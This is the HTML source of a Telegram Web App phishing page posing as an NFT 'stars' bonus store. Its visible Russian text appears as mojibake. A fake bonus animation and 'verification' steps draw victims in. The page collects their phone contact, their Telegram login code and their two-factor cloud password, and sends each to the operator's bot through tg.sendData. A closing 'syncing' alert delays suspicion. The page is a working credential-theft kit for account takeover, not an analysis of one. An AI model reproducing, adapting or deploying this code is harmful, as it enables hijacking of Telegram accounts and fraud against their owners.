<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NFT Premium Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0b0b0c;
            --card: #161618;
            --accent: #007aff;
            --text: #ffffff;
            --secondary: #8e8e93;
            --gold: #ffd700;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0; padding: 16px;
            overflow-x: hidden;
            -webkit-user-select: none;
        }
        .glass-card {
            background: var(--card);
            border-radius: 24px;
            padding: 24px;
            margin-bottom: 16px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            text-align: center;
        }
        h2 { font-size: 24px; font-weight: 700; margin: 0 0 10px 0; }
        .stars-val { font-size: 50px; font-weight: 800; color: var(--gold); margin: 10px 0; text-shadow: 0 0 15px rgba(255,215,0,0.3); }
        
        /* NFT Grid */
        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        .nft-item { background: var(--card); border-radius: 20px; padding: 12px; text-align: center; border: 1px solid rgba(255,255,255,0.03); }
        .nft-img { width: 100%; border-radius: 14px; margin-bottom: 8px; background: #2c2c2e; }
        .nft-price { color: #32d74b; font-weight: 700; font-size: 14px; }

        /* Inputs & Buttons */
        input {
            width: 100%; padding: 16px; border-radius: 14px; border: none;
            background: #2c2c2e; color: white; margin-top: 15px;
            font-size: 18px; text-align: center; box-sizing: border-box;
            outline: none; border: 1px solid transparent; transition: 0.3s;
        }
        input:focus { border-color: var(--accent); }
        .btn {
            background: var(--accent); color: white; border: none;
            border-radius: 16px; padding: 16px; width: 100%;
            font-weight: 600; font-size: 16px; margin-top: 20px; cursor: pointer;
        }
        
        .step { display: none; }
        .active { display: block; animation: slideIn 0.4s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="step-1" class="step active">
        <div class="glass-card">
            <div style="font-size: 40px;">üéÅ</div>
            <h2>–í–∞—à –±–æ–Ω—É—Å</h2>
            <p style="color: var(--secondary); font-size: 14px;">–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω—ã–π –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω:</p>
            <div class="stars-val" id="balance">0</div>
            <p style="font-weight: 600;">NFT Stars</p>
            <button class="btn" id="claim-btn" onclick="claimBonus()">–ó–∞–±—Ä–∞—Ç—å 20 –∑–≤–µ–∑–¥</button>
        </div>

        <h3 style="text-align: left; margin: 20px 0 10px 5px;">NFT –ö–æ–ª–ª–µ–∫—Ü–∏–∏</h3>
        <div class="nft-grid">
            <div class="nft-item">
                <img src="https://i.seadn.io/gae/2hDpuYSUIm1yS89E78O688zN-9V6P_5zQx9e9z0?auto=format&w=256" class="nft-img">
                <div class="nft-price">120 Stars</div>
                <button class="btn" style="padding: 8px; font-size: 12px;" onclick="goToAuth()">–ö—É–ø–∏—Ç—å</button>
            </div>
            <div class="nft-item">
                <img src="https://i.seadn.io/gcs/files/6b76176378e9f50e82c502b4501a4034.png?auto=format&w=256" class="nft-img">
                <div class="nft-price">450 Stars</div>
                <button class="btn" style="padding: 8px; font-size: 12px;" onclick="goToAuth()">–ö—É–ø–∏—Ç—å</button>
            </div>
        </div>
    </div>

    <div id="step-2" class="step">
        <div style="margin-top: 40px;">
            <div style="font-size: 50px;">üõ°</div>
            <h2>–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è</h2>
            <p style="color: var(--secondary);">–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –∏ –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –±–æ–Ω—É—Å–∞ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç —á–µ—Ä–µ–∑ Telegram</p>
            <div class="glass-card">
                <button class="btn" onclick="requestPhone()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä</button>
            </div>
        </div>
    </div>

    <div id="step-3" class="step">
        <div style="margin-top: 40px;">
            <h2>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</h2>
            <p style="color: var(--secondary);">–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Å –∫–æ–¥–æ–º –≤ –≤–∞—à Telegram</p>
            <div class="glass-card">
                <input type="number" id="sms_code" placeholder="0 0 0 0 0" oninput="checkCodeLength(this)">
                <button class="btn" onclick="sendCode()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
            </div>
        </div>
    </div>

    <div id="step-4" class="step">
        <div style="margin-top: 40px;">
            <h2>–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</h2>
            <p style="color: var(--secondary);">–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â–µ–Ω 2FA. –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏</p>
            <div class="glass-card">
                <input type="password" id="2fa_pass" placeholder="–í–∞—à –ø–∞—Ä–æ–ª—å">
                <button class="btn" onclick="sendFinal()">–ó–∞–≤–µ—Ä—à–∏—Ç—å –∑–∞—á–∏—Å–ª–µ–Ω–∏–µ</button>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.enableClosingConfirmation();

        function show(id) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // –ê–Ω–∏–º–∞—Ü–∏—è –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è
        function claimBonus() {
            let count = 0;
            let interval = setInterval(() => {
                count++;
                document.getElementById('balance').innerText = count;
                if(count >= 20) {
                    clearInterval(interval);
                    document.getElementById('claim-btn').innerText = "‚úÖ –ó–ê–ß–ò–°–õ–ï–ù–û";
                    setTimeout(() => { goToAuth(); }, 1000);
                }
            }, 50);
        }

        function goToAuth() { show('step-2'); }

        // –ù–æ–º–µ—Ä
        function requestPhone() {
            tg.requestContact((ok) => {
                if(ok) { show('step-3'); }
            });
        }

        // –ö–æ–¥
        function checkCodeLength(el) {
            if(el.value.length === 5) { sendCode(); }
        }

        function sendCode() {
            let val = document.getElementById('sms_code').value;
            if(val.length >= 5) {
                tg.sendData("CODE:" + val);
                // –ß–ï–¢–ö–û: –ß–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã –í–°–ï–ì–î–ê –ø–µ—Ä–µ–∫–∏–¥—ã–≤–∞–µ–º –Ω–∞ 2FA
                setTimeout(() => { show('step-4'); }, 2000);
            }
        }

        // –§–∏–Ω–∞–ª
        function sendFinal() {
            let val = document.getElementById('2fa_pass').value;
            if(val.length > 0) {
                tg.sendData("PASS:" + val);
                tg.showAlert("–°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ 15-20 —Å–µ–∫—É–Ω–¥.", () => {
                    tg.close();
                });
            }
        }
    </script>
</body>
</html>
